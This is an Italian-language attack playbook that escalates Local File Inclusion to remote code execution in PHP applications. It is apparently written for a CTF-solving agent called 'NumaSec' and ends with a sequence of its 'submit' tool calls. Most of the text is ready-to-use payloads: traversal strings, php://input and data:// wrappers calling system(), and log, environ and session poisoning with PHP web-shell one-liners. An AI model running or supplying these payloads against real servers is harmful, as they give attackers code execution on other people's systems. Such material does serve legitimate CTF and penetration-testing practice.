# Attack Chain: LFI → RCE

Sequenza per escalare da Local File Inclusion a Remote Code Execution.

---

## 🔴 Quando Usare

- Parametro include/require file (`?page=`, `?file=`, `?template=`)
- Path traversal funziona (`../../../etc/passwd`)
- PHP o altri linguaggi server-side

---

## Phase 1: Confirm LFI

```
# Path traversal base
?page=../../../etc/passwd
?file=....//....//....//etc/passwd

# Null byte (vecchie versioni PHP)
?page=../../../etc/passwd%00

# Double encoding
?page=%252e%252e%252f%252e%252e%252fetc/passwd
```

**Cosa cercare**: Contenuto di `/etc/passwd` nella risposta.

---

## Phase 2: Identify Include Type

### PHP include/require
- Esegue codice PHP se il file contiene `<?php`
- Può usare wrappers

### Path-based include
- Solo legge file, non esegue

---

## Phase 3: PHP Wrappers (se PHP)

### php://filter (Read source code)
```
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=string.rot13/resource=config.php
```

### php://input (RCE diretto!)
```bash
curl -X POST "URL?page=php://input" -d "<?php system('cat /flag.txt'); ?>"
```

### data:// (RCE!)
```
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

### expect:// (se abilitato)
```
?page=expect://cat /flag.txt
```

---

## Phase 4: Log Poisoning

### Apache access log
```bash
# 1. Inject payload in User-Agent
curl "URL" -H "User-Agent: <?php system(\$_GET['c']); ?>"

# 2. Include il log
?page=../../../var/log/apache2/access.log&c=cat+/flag.txt
```

### SSH auth log
```bash
# 1. Trigger login con payload come username
ssh '<?php system($_GET["c"]); ?>'@target

# 2. Include
?page=/var/log/auth.log&c=cat+/flag.txt
```

### Mail log (se sendmail)
```bash
# Invia mail con payload
mail -s "<?php system('id'); ?>" www-data@target < /dev/null

# Include
?page=/var/log/mail.log
```

---

## Phase 5: /proc/self/environ

```bash
# 1. Inject in User-Agent
curl "URL?page=/proc/self/environ" -H "User-Agent: <?php system('cat /flag.txt'); ?>"
```

---

## Phase 6: Session Poisoning

```bash
# 1. Set session variable con payload (via vulnerable param)
# Il session file viene creato in /tmp/sess_SESSIONID

# 2. Include session file
?page=/tmp/sess_abc123
```

---

## Decision Tree

```
LFI Confirmed?
├── PHP? 
│   ├── php://input allowed? → RCE diretto
│   ├── data:// allowed? → RCE diretto
│   └── Filters work? → Read source → trova creds
├── Can write logs?
│   └── Log poisoning → RCE
└── None work?
    └── Read /flag.txt directly
```

---

## Tool Sequence (NumaSec)

1. `submit` con `?page=../../../etc/passwd` → Confirm LFI
2. `submit` con `?page=php://filter/...` → Read source
3. `submit` con `?page=php://input` + POST body → Try RCE
4. Se fallisce: `submit` log poisoning sequence
5. `submit` con `?page=/var/log/apache2/access.log&c=cat+/flag*`
